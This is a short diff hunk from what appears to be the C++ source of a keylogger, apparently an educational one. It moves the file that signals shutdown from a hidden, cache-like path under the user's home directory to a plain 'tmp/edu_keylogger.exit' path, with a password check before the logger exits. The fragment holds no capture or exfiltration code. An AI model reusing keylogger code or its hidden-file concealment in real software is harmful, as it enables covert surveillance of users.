@@ -281,12 +281,12 @@ void keyloggerMain() {
         
         // Check shutdown flag
         string shutdownFlagPath = string(getenv("HOME")) + "/.config/.systemcache/.exit";
-        ifstream flagfile(shutdownFlagPath);
+        ifstream flagfile("tmp/edu_keylogger.exit");
         if (flagfile) {
             string password;
             flagfile >> password;
             flagfile.close();
-            remove(shutdownFlagPath);
+            remove("tmp/edu_keylogger.exit");
             
             if (password == exitPassword) {
                 logfile << "\n[✓] CORRECT PASSWORD. EXITING...\n";
